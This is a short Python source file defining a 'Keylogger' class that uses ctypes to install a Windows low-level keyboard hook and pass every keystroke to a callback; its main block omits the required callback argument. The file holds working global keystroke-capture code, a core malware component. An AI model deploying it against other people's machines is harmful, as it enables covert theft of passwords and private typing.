import ctypes
from ctypes import wintypes

VK_CODE = {i: i for i in range(256)}


class Keylogger:

    def __init__(self, hookfunc):
        self.current_sequence = []
        self.user32 = ctypes.WinDLL('user32', use_last_error=True)
        self.hookfunc = hookfunc

    current_sequence = []




    def low_level_keyboard_handler(self, nCode, wParam, lParam):

        if wParam == 256:
            key = VK_CODE[lParam[0]]
            self.hookfunc(key)
            # print(chr(key))
        return self.user32.CallNextHookEx(None, nCode, wParam, lParam)

    def start(self):
        LOWLEVELKEYBOARDPROC = ctypes.WINFUNCTYPE(ctypes.c_long, ctypes.c_int, wintypes.WPARAM,
                                                  ctypes.POINTER(ctypes.c_ulong))
        pointer = LOWLEVELKEYBOARDPROC(self.low_level_keyboard_handler)
        hook_id = self.user32.SetWindowsHookExA(13, pointer, 0, 0)

        msg = ctypes.wintypes.MSG()
        while self.user32.GetMessageA(ctypes.byref(msg), None, 0, 0) != 0:
            self.user32.TranslateMessage(ctypes.byref(msg))
            self.user32.DispatchMessageA(ctypes.byref(msg))

        self.user32.UnhookWindowsHookEx(hook_id)


if __name__ == '__main__':
    keylogger = Keylogger()
    keylogger.start()
